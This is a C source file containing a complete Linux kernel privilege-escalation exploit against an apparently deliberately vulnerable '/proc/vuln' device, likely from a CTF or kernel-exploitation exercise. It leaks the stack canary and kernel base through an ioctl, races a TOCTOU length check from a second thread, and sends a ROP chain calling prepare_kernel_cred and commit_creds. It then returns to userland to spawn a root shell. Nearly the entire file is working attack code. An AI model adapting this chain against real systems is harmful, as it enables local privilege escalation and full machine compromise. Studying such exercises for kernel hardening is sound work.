#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>


#if HAVE_STROPTS_H
#include <stropts.h>
#endif

#define SET_MAX 0x10
#define COPY_DATA 0x20
#define SAVE_DATA 0x30
#define READ_DATA 0x40

int fd;
typedef struct data{
	char * content;
    volatile size_t length;
};
struct data request;

int finish;
int overflow_amount = 260;
unsigned long canary, IMAGE_BASE;

unsigned long user_cs, user_ss, user_sp, user_rflags;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

void open_device(void) {
    puts("[*] Opening vuln");
    fd = open("/proc/vuln", O_RDWR);
    if (fd < 0) {
        puts("[!] Failed to open device");
        exit(-1);
    }
    printf("[+] Device opened successfully, fd: %d\n", fd);
} 

void close_device(void) {
    if(close(fd) == -1) {
        puts("[!] Error closing the device");
        exit(-1);
    }
    puts("[+] Device closed");
}

void change_max(unsigned long max) {
    if (ioctl(fd, SET_MAX, max) == -1) {
        puts("[!] Error calling ioctl");
        exit(-1);
    }
    printf("[+] Max changed to %lu\n", max);
}

void change_len(void *r){
    size_t * length = (size_t *) r;
    while(finish==0){
        *length = overflow_amount; // compiler optimization will fuck with this, leave at -O0
    }
}

unsigned long user_rip = (unsigned long)get_shell;
unsigned long pop_rdi, swapgs_popfq, iretq, prepare_kernel_cred, commit_creds;

void calculate_gadgets(){
    prepare_kernel_cred = IMAGE_BASE+0x895e0;
    commit_creds = IMAGE_BASE+0x892c0;
    pop_rdi = IMAGE_BASE+0x2c3a;
    swapgs_popfq = IMAGE_BASE+0xc00eaa;
    iretq = IMAGE_BASE+0x24362;
}

void toctou(void){
    //int attempts = 0x1000;
    pthread_t t1;
    unsigned long * payload = malloc(0x400);

    calculate_gadgets();
    finish = 0;
    int index = 0;
    int offset = 30;
    for(int i = 0; i < offset; i++){
        payload[i] = 0x4141414141414141;
    }
    index = offset;
    payload[index++] = canary;
    payload[index++] = 0x4242424242424242;
    payload[index++] = 0x4343434343434343;
    payload[index++] = 0x4444444444444444;
    payload[index++] = pop_rdi; // pop rdi; ret;
    payload[index++] = 0x0;
    payload[index++] = prepare_kernel_cred;
    payload[index++] = commit_creds;
    payload[index++] = swapgs_popfq;
    payload[index++] = 0x0;
    payload[index++] = iretq;
    payload[index++] = user_rip;
    payload[index++] = user_cs;
    payload[index++] = user_rflags;
    payload[index++] = user_sp;
    payload[index++] = user_ss;
    overflow_amount = (index*8);

    request.length = 15;
    request.content = payload;

    puts("[*] Racing TOCTOU in edit_storage");
    
    long num_copied = 0;
    pthread_create(&t1, NULL, change_len, &request.length);
    while(num_copied != overflow_amount){
        num_copied = ioctl(fd, COPY_DATA, &request);
        request.length = 15;
    }
    puts("[+] Race won, payload sent");
    finish = 1;
    pthread_join(t1,NULL);
}

void leak(void) {
    change_max(9000);
    int upto = 400;
    unsigned long leak[upto];
    leak[0] = 200;
    ioctl(fd, READ_DATA, leak);
    canary = leak[22];
    printf("[+] Stack canary: 0x%lx\n", canary);
    printf("[+] Original return address: 0x%lx\n", leak[10]);
    IMAGE_BASE = leak[10] - 0x1aa060;
    printf("[+] IMAGE_BASE: 0x%lx\n", IMAGE_BASE);
}

void copy_to_stack(void){
    puts("[*] Copying request to kernel stack frame");
    ioctl(fd, SAVE_DATA, NULL);
}

int main(){
    save_state();
    open_device();
    puts("\n[!] This exploit is unreliable, re-run if it fails.\n");
    leak();
    signal(SIGSEGV, get_shell);
    toctou();
    copy_to_stack();
    close_device();
}
